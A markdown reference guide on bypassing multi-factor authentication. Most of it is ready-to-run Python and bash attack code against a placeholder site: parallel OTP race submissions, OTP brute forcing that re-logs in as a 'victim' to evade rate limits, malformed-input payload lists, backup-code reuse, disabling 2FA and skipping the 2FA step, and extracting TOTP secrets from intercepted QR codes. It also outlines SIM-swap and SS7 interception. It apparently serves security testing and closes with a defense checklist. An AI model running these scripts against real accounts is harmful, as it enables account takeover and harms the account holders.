# MFA Bypass Techniques Guide

> Practical reference for testing multi-factor authentication implementations including 2FA race conditions, backup code abuse, SIM swap vectors, and implementation flaws.

---

## 1. 2FA Race Condition Exploitation

Race conditions in 2FA verification can allow code reuse or bypass when concurrent requests are processed before the code is invalidated.

```python
# Race condition: submit same OTP code in parallel before invalidation
import asyncio
import aiohttp

async def submit_otp(session, url, otp_code, attempt_id):
    data = {"otp": otp_code, "session_token": "valid_session_token"}
    async with session.post(url, json=data) as resp:
        body = await resp.json()
        return {"attempt": attempt_id, "status": resp.status, "success": body.get("success")}

async def race_2fa(url, valid_otp, concurrent=20):
    connector = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [submit_otp(session, url, valid_otp, i) for i in range(concurrent)]
        results = await asyncio.gather(*tasks)
        
        successes = [r for r in results if r["success"]]
        print(f"Successes: {len(successes)} / {concurrent}")
        if len(successes) > 1:
            print("VULNERABLE: OTP accepted multiple times (race condition)")
        return results

asyncio.run(race_2fa("https://target.com/api/verify-2fa", "123456"))
```

```bash
# Parallel OTP submission using curl
OTP="123456"
SESSION="valid_pre_2fa_session"
URL="https://target.com/api/verify-2fa"

for i in $(seq 1 20); do
  curl -s -o /dev/null -w "Attempt $i: %{http_code}\n" \
    -X POST "$URL" \
    -H "Content-Type: application/json" \
    -H "Cookie: session=$SESSION" \
    -d "{\"otp\":\"$OTP\"}" &
done
wait
```

---

## 2. OTP Brute Force and Rate Limit Bypass

```python
# Brute-force 6-digit OTP with rate limit evasion
import requests
import time

target = "https://target.com/api/verify-2fa"
session_token = "pre_2fa_session_cookie"

# Test 1: Direct brute force (check if rate limited)
for code in range(0, 10):
    resp = requests.post(target, json={"otp": f"{code:06d}"}, 
                        cookies={"session": session_token})
    if resp.status_code == 429:
        print(f"Rate limited after {code} attempts")
        break
    if resp.json().get("success"):
        print(f"Valid OTP: {code:06d}")
        break

# Test 2: New session per attempt (bypass per-session rate limit)
for code in range(0, 100):
    # Re-authenticate to get fresh pre-2FA session
    s = requests.Session()
    s.post("https://target.com/login", data={"user": "victim", "pass": "known_pass"})
    resp = s.post(target, json={"otp": f"{code:06d}"})
    if resp.json().get("success"):
        print(f"Valid OTP found: {code:06d}")
        break
    time.sleep(0.5)
```

```bash
# Test OTP length and format validation
URL="https://target.com/api/verify-2fa"
SESSION="pre_2fa_session"

# Test various OTP formats
PAYLOADS=(
  '{"otp":"000000"}'          # All zeros
  '{"otp":"      "}'          # Spaces
  '{"otp":""}'                # Empty
  '{"otp":null}'              # Null
  '{"otp":"000000000"}'       # Longer than expected
  '{"otp":"12345"}'           # Shorter than expected
  '{"otp":"abcdef"}'          # Non-numeric
  '{"otp":0}'                 # Integer instead of string
  '{"otp":["123456"]}'        # Array
)

for payload in "${PAYLOADS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$URL" \
    -H "Content-Type: application/json" \
    -b "session=$SESSION" \
    -d "$payload")
  echo "$payload -> HTTP $STATUS"
done
```

---

## 3. Backup Code Abuse

```python
# Test backup code implementation weaknesses
import requests
import itertools

target = "https://target.com/api/verify-backup-code"
session = "pre_2fa_session"

# Test 1: Backup code format analysis
# Common formats: 8-char alphanumeric, 10-digit numeric, UUID-like
test_codes = [
    "12345678",      # 8-digit numeric
    "ABCD-EFGH",     # Formatted alphanumeric
    "a1b2c3d4e5",    # 10-char mixed
]

for code in test_codes:
    resp = requests.post(target, 
                        json={"backup_code": code},
                        cookies={"session": session})
    print(f"Code '{code}': {resp.status_code} - {resp.text[:100]}")

# Test 2: Backup code reuse (should be single-use)
valid_backup = "KNOWN-BACKUP-CODE"
for i in range(3):
    resp = requests.post(target,
                        json={"backup_code": valid_backup},
                        cookies={"session": session})
    print(f"Use {i+1}: {resp.status_code} - {'ACCEPTED' if resp.status_code == 200 else 'REJECTED'}")

# Test 3: Unlimited backup code generation
# Some apps let you regenerate codes without re-verifying identity
resp = requests.post("https://target.com/api/generate-backup-codes",
                    cookies={"session": "authenticated_session"})
print(f"Regenerate without 2FA: {resp.status_code}")
```

---

## 4. 2FA Enrollment Bypass

```bash
# Test if 2FA can be disabled without current 2FA verification
# Step 1: Authenticate normally
SESSION=$(curl -s -c - -X POST https://target.com/login \
  -d "username=testuser&password=testpass" | grep session | awk '{print $NF}')

# Step 2: Try to disable 2FA without providing current OTP
curl -s -X POST https://target.com/api/settings/disable-2fa \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"password":"testpass"}' | jq .

# Step 3: Test if 2FA setup can be overwritten
# (Register new TOTP secret without verifying old one)
curl -s -X POST https://target.com/api/settings/setup-2fa \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"method":"totp"}' | jq .
```

```python
# Test 2FA step skip - access authenticated endpoints without completing 2FA
import requests

# Login (step 1 of 2)
s = requests.Session()
s.post("https://target.com/login", data={"username": "user", "password": "pass"})

# Skip 2FA verification and directly access protected resources
endpoints = [
    "/api/profile",
    "/api/settings",
    "/api/transactions",
    "/dashboard",
    "/api/users",
    "/api/admin",
]

for endpoint in endpoints:
    resp = s.get(f"https://target.com{endpoint}")
    if resp.status_code == 200 and "login" not in resp.url:
        print(f"VULNERABLE: {endpoint} accessible without 2FA (HTTP {resp.status_code})")
    else:
        print(f"SECURE: {endpoint} requires 2FA (HTTP {resp.status_code})")
```

---

## 5. TOTP Implementation Flaws

```python
# Test TOTP time window and drift tolerance
import pyotp
import time
import requests

# If you have the TOTP secret (from QR code interception or backup)
secret = "JBSWY3DPEHPK3PXP"  # Base32 encoded secret
totp = pyotp.TOTP(secret)

# Test time drift acceptance window
target = "https://target.com/api/verify-2fa"
session = "pre_2fa_session"

# Generate codes for different time offsets
for offset in range(-5, 6):  # -5 to +5 intervals (each 30s)
    code = totp.at(time.time() + (offset * 30))
    resp = requests.post(target, 
                        json={"otp": code},
                        cookies={"session": session})
    accepted = resp.status_code == 200
    print(f"Offset {offset:+d} ({offset*30:+d}s): {code} -> {'ACCEPTED' if accepted else 'REJECTED'}")

# Large drift windows increase brute-force feasibility
# Acceptable: +/- 1 window (90 seconds total)
# Risky: +/- 3+ windows (210+ seconds)
```

```bash
# Extract TOTP secret from QR code or provisioning URI
# If you can intercept the 2FA setup response:
# otpauth://totp/App:user@example.com?secret=JBSWY3DPEHPK3PXP&issuer=App

# Decode QR code image to extract secret
zbarimg qr_code.png 2>/dev/null | grep -oP 'secret=\K[A-Z2-7]+'

# Generate valid TOTP from extracted secret
python3 -c "
import pyotp, sys
secret = sys.argv[1]
totp = pyotp.TOTP(secret)
print(f'Current OTP: {totp.now()}')
print(f'Valid for: {30 - (int(__import__(\"time\").time()) % 30)}s')
" "JBSWY3DPEHPK3PXP"
```

---

## 6. SIM Swap and SMS Interception Vectors

```yaml
# SMS-based 2FA vulnerability assessment
sms_2fa_risks:
  sim_swap:
    description: "Attacker convinces carrier to transfer victim's number"
    prerequisites:
      - "Victim's phone number"
      - "Personal information for carrier verification"
      - "Social engineering of carrier support"
    detection:
      - "Monitor for unexpected loss of cellular service"
      - "Register for carrier account change notifications"
      
  ss7_interception:
    description: "Exploit SS7 protocol to intercept SMS messages"
    prerequisites:
      - "Access to SS7 network (telecom insider or purchased access)"
      - "Victim's phone number and IMSI"
    mitigation:
      - "Use app-based TOTP instead of SMS"
      - "Use hardware security keys (FIDO2/WebAuthn)"
      
  testing_approach:
    - "Verify app falls back to SMS when TOTP unavailable"
    - "Test if SMS code has longer validity than TOTP"
    - "Check if SMS delivery failure reveals code in error message"
    - "Test if phone number change requires current 2FA"
```

```bash
# Test SMS 2FA implementation weaknesses
# Check if SMS code is returned in API response (information disclosure)
curl -s -X POST https://target.com/api/send-otp \
  -H "Content-Type: application/json" \
  -d '{"phone":"+1234567890"}' | jq .
# Look for code/otp/token in response body

# Test if phone number can be changed without 2FA
curl -s -X PUT https://target.com/api/settings/phone \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"phone":"+1attacker_number"}' | jq .
```

---

## 7. Defense Validation

```yaml
# MFA security checklist
mfa_security:
  implementation:
    - totp_preferred_over_sms: true
    - hardware_key_support: true  # FIDO2/WebAuthn
    - backup_codes_single_use: true
    - rate_limiting_on_verification: "5 attempts per 5 minutes"
    - account_lockout_after_failures: "10 attempts"
    
  enrollment:
    - requires_current_auth: true
    - secret_transmitted_securely: true
    - verification_required_before_activation: true
    - cannot_disable_without_current_2fa: true
    
  session:
    - 2fa_status_server_side: true  # Not in cookie/JWT
    - step_up_auth_for_sensitive: true
    - no_bypass_via_direct_url: true
```

MFA testing should verify both the cryptographic implementation and the surrounding workflow logic. Many bypasses exploit the session management around 2FA rather than the OTP algorithm itself.
